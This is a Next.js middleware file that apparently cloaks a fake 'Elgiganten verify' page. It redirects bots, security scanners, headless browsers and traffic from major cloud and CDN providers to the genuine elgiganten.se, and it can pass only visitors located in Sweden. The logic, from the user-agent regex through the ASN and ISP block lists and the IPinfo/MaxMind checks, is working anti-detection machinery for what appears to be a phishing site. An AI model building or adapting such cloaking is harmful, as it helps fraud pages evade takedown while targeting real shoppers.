// middleware.ts
import { NextResponse, NextRequest } from "next/server";

export const config = {
  matcher: ["/elgiganten/verify/:path*"],
};

/* ========= RUNTIME CONFIG / LOGGING ========= */
const REDIRECT_URL = "https://www.elgiganten.se";
const VERBOSE = process.env.MW_VERBOSE_LOGS !== "0";
const log = (...args: any[]) => VERBOSE && console.log("[MW]", ...args);

/* ========= Provider blocklists (ASN + name/domain snippets) ========= */
const BAD_ASN = new Set<string>([
  // Google
  "AS15169", "AS396982",
  // Cloudflare
  "AS13335",
  // Amazon / AWS
  "AS16509", "AS14618",
  // Microsoft / Azure / Bing
  "AS8075", "AS8068",
  // Meta / Facebook
  "AS32934",
  // Fastly
  "AS54113",
  // Akamai
  "AS20940",
  // "AS8708", // (your ISP test)
]);

const BAD_NAME_SNIPPETS: string[] = [
  "google", "google llc", "google cloud", "googlebot",
  "cloudflare", "cloudflare, inc",
  "amazon", "aws", "amazon.com", "amazon technologies",
  "microsoft", "azure", "bing",
  "meta", "facebook", "facebook inc",
  "fastly",
  "akamai",
  // ISP extras
  "triple t broadband public company limited",
  "triple t broadband",
  "3bb",
  "rds", "digi",
  "vodafone","mobifon",
];

/** Add-on ASN + name rules */
const EXTRA_BAD_ASN: string[] = [
  "AS15169", "AS396982", "AS36040", "AS19527", "AS139070", "AS36561", "AS43515", "AS16550",
  "AS32934", "AS63293",
  "AS8075", "AS8068", "AS8069", "AS12076", "AS13443", "AS14413", "AS40793",
  "AS16509", "AS14618", "AS7224", "AS19047", "AS36263", "AS8987",
  "AS13335",
  "AS20940", "AS12222", "AS16625", "AS16702", "AS35994", "AS32787", "AS63949",
  "AS54113",
];
for (const a of EXTRA_BAD_ASN) BAD_ASN.add(a.toUpperCase());

const EXTRA_BAD_NAME_SNIPPETS: string[] = [
  "google", "google llc", "google ireland limited", "google cloud",
  "googlebot", "youtube", "ggc", "1e100.net", "googleusercontent.com", "gvt1.com", "google.com",
  "meta", "meta platforms", "facebook", "facebook inc", "fb.com",
  "instagram", "whatsapp", "oculus", "threads", "meta.com", "facebook.com", "instagram.com",
  "microsoft", "microsoft corporation", "azure", "windows.net", "bing", "msn",
  "microsoft.com", "azure.com", "linkedin", "linkedin corporation", "linkedin.com",
  "amazon", "amazon.com", "amazon technologies", "aws", "amazon web services",
  "amazonaws.com", "cloudfront.net",
  "cloudflare", "cloudflare, inc", "cloudflare.com",
  "akamai", "akamai technologies", "akamai international", "akamaiedge.net",
  "akamaitechnologies.com", "akamai.com", "prolexic",
  "fastly", "fastly, inc", "fastly.com", "fastly.net",
  "linode", "linode, llc", "linode.com",
];
BAD_NAME_SNIPPETS.push(...EXTRA_BAD_NAME_SNIPPETS.map((s) => s.toLowerCase()));

/* ======= ENV-driven extensions ======= */
if (process.env.BLOCKED_ASNS) {
  for (const asn of process.env.BLOCKED_ASNS.split(",")) {
    const v = asn.trim().toUpperCase();
    if (v) BAD_ASN.add(v);
  }
}
if (process.env.BLOCKED_ISP_SUBSTRS) {
  for (const s of process.env.BLOCKED_ISP_SUBSTRS.split(",")) {
    const v = s.trim().toLowerCase();
    if (v) BAD_NAME_SNIPPETS.push(v);
  }
}

/** Country rules
 *  - If ALLOWED_COUNTRY is set, only that 2-letter code is allowed (e.g. SE)
 *  - Else, use BLOCKED_COUNTRY_CODES deny list (optional)
 */
const ALLOWED_COUNTRY = (process.env.ALLOWED_COUNTRY || "").trim().toUpperCase();
const BAD_COUNTRIES = new Set<string>(
  (process.env.BLOCKED_COUNTRY_CODES || "")
    .split(",")
    .map((c) => c.trim().toUpperCase())
    .filter(Boolean),
);

function isBlockedByCountry(arg: { code?: string; name?: string }) {
  const code = (arg.code || "").toUpperCase();
  const name = (arg.name || "").toUpperCase();

  if (ALLOWED_COUNTRY) {
    // Prefer ISO code; if absent, try simple name → code for Sweden
    const effective = code || (name === "SWEDEN" ? "SE" : "");
    // If still unknown, be conservative and block
    if (!effective) return true;
    return effective !== ALLOWED_COUNTRY;
  }

  // Deny-list mode
  const candidate = code || name;
  return candidate ? BAD_COUNTRIES.has(candidate) : false;
}

/* ========= Bot UA detection ========= */
const BOT_UA =
  /(bot|crawler|spider|crawling|curl|wget|python-requests|httpclient|libwww|urlgrabber|^python|^php|^java|go-http-client|okhttp|feedfetcher|readability|preview|scan|probe|monitor|checker|validator|analyzer|scrape|scraper|headless|phantomjs|slimerjs|puppeteer|playwright|rendertron|facebookexternalhit|facebot|slackbot|twitterbot|linkedinbot|pinterest|discordbot|telegrambot|whatsapp|skypeuripreview|googlebot|adsbot-google|google-read-aloud|google-cloudvertexbot|mediapartners-google|bingbot|bingpreview|yandex|baiduspider|duckduckbot|sogou|seznambot|semrush|ahrefs|mj12bot|dotbot|gigabot|petalbot|applebot|ia_archiver|amazonbot)/i;

/* ========= Helpers ========= */
function getClientIp(req: NextRequest): string | null {
  const fwd = req.headers.get("x-forwarded-for");
  if (fwd) {
    const ip = fwd.split(",")[0]?.trim();
    if (ip) return ip;
  }
  const cf = req.headers.get("cf-connecting-ip");
  if (cf) return cf.trim();
  const xr = req.headers.get("x-real-ip");
  if (xr) return xr.trim();
  return null;
}

async function ipinfoLookup(ip: string, token?: string) {
  if (!token) {
    log("No IPINFO_TOKEN; skipping IPinfo.");
    return null;
  }
  const url = `https://api.ipinfo.io/lite/${encodeURIComponent(ip)}?token=${encodeURIComponent(token)}`;
  const controller = new AbortController();
  const to = setTimeout(() => controller.abort(), 1200);
  try {
    log("IPinfo query:", ip);
    const res = await fetch(url, { signal: controller.signal, cache: "no-store" });
    clearTimeout(to);
    if (!res.ok) {
      log("IPinfo non-OK:", res.status, res.statusText);
      return null;
    }
    const json = (await res.json()) as {
      asn?: string;
      as_name?: string;
      as_domain?: string;
      country?: string;        // "Sweden"
      country_code?: string;   // "SE"
    };
    log("IPinfo response:", json);
    return json;
  } catch (e) {
    clearTimeout(to);
    log("IPinfo error:", e);
    return null;
  }
}

function matchesBadProviderLite(rec: { asn?: string; as_name?: string; as_domain?: string } | null) {
  if (!rec) return false;
  const { asn, as_name, as_domain } = rec;
  if (asn && BAD_ASN.has(asn.toUpperCase())) {
    log("Block by ASN:", asn);
    return true;
  }
  const name = (as_name || "").toLowerCase();
  const domain = (as_domain || "").toLowerCase();
  const hit = BAD_NAME_SNIPPETS.find((n) => name.includes(n) || domain.includes(n));
  if (hit) {
    log(`Block by ISP substring: "${hit}" in name="${name}" domain="${domain}"`);
    return true;
  }
  return false;
}

async function maxmindLookup(req: NextRequest, ip: string) {
  const controller = new AbortController();
  const to = setTimeout(() => controller.abort(), 1200);
  try {
    const url = new URL("/api/isp-lookup", req.nextUrl.origin);
    url.searchParams.set("ip", ip);
    log("MaxMind check:", url.toString());
    const res = await fetch(url.toString(), {
      method: "GET",
      signal: controller.signal,
      headers: { "x-mw": "1" },
      cache: "no-store",
    });
    clearTimeout(to);
    if (!res.ok) {
      log("MaxMind non-OK:", res.status);
      return null;
    }
    const json = (await res.json()) as { isBad?: boolean; reason?: string; isp?: string; asn?: string };
    log("MaxMind response:", json);
    return json;
  } catch (e) {
    clearTimeout(to);
    log("MaxMind error:", e);
    return null;
  }
}

/* ========= Middleware ========= */
export async function middleware(req: NextRequest) {
  const ua = req.headers.get("user-agent") || "";
  const ip = getClientIp(req);
  log("— MW START —", { path: req.nextUrl.pathname, ip, ua });

  // 0) Bot UA block
  if (BOT_UA.test(ua)) {
    log("Block by UA bot signature");
    return NextResponse.redirect(REDIRECT_URL, { status: 302 });
  }

  // 1) IPinfo checks (country + ASN/name)
  if (ip) {
    const lite = await ipinfoLookup(ip, process.env.IPINFO_TOKEN);

    // Country rule (allow-only if ALLOWED_COUNTRY set, else deny-list)
    if (lite && isBlockedByCountry({ code: (lite as any).country_code, name: lite.country })) {
      log("Block by country:", { code: (lite as any).country_code, name: lite.country });
      return NextResponse.redirect(REDIRECT_URL, { status: 302 });
    }
    // If allow-only mode and IPinfo gave no country at all, block conservatively
    if (ALLOWED_COUNTRY && (!lite || (!(lite as any).country_code && !lite.country))) {
      log("Block by country: missing code while allow-only active");
      return NextResponse.redirect(REDIRECT_URL, { status: 302 });
    }

    if (matchesBadProviderLite(lite)) {
      log("Redirect (IPinfo match) →", REDIRECT_URL);
      return NextResponse.redirect(REDIRECT_URL, { status: 302 });
    }

    // 2) MaxMind secondary signal
    const mm = await maxmindLookup(req, ip);
    if (mm?.isBad) {
      log("Redirect (MaxMind match) →", REDIRECT_URL);
      return NextResponse.redirect(REDIRECT_URL, { status: 302 });
    }
  } else {
    log("No client IP found; skipping IP-based checks");
  }

  // 3) Allow through
  log("Allow through");
  return NextResponse.next();
}
